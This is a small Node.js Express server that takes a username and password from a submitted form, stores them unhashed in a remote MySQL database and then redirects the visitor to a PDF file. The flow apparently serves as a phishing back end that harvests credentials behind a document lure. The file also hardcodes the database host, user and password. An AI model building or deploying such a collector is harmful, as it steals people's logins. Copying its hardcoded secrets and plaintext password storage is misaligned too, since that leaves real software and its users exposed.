const express = require('express');
const app = express();
const mysql = require('mysql');

app.use(express.urlencoded({ extended: true }));

// create connection
const connection = mysql.createConnection({
  host : 'sql12.freesqldatabase.com',
  user : 'sql12627730',
  password : 'KQepFIcVmv',
  database : 'sql12627730',
  port : "3306"
});

connection.connect((err) => {
if (err) {
  console.error('Error connecting to MySQL:', err);
  return;
}
console.log('Connected to MySQL database');
});


//create table

const createTableSQL = `
CREATE TABLE IF NOT EXISTS users (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(255),
  password VARCHAR(255)
)
`;
  
  connection.query(createTableSQL, (err, result) => {
if (err) {
  console.error('Error creating table:', err);
} else {
  console.log('Table created successfully');
}
});


// Serve static files from the "public" directory
app.use(express.static('public'));
app.use(express.static(__dirname + '/public'));

// Handle form submission

  app.post('/submit', (req, res) => {
   
    const username = req.body.username;
    const password = req.body.password;
// console.log(`${username}` ,`${password}` ); 

  // Update table with variable values
  connection.query('INSERT INTO users (username, password) VALUES (?, ?)', [username, password], (err, result) => {
    if (err) {
      console.error('Error updating table:', err);
      res.status(500).send('Error updating value');
    } else {
      console.log('Table updated successfully');
     res.redirect('/1.pdf');
    }
  });

});

    
// Start the server

 app.listen(process.env.PORT || 3000)
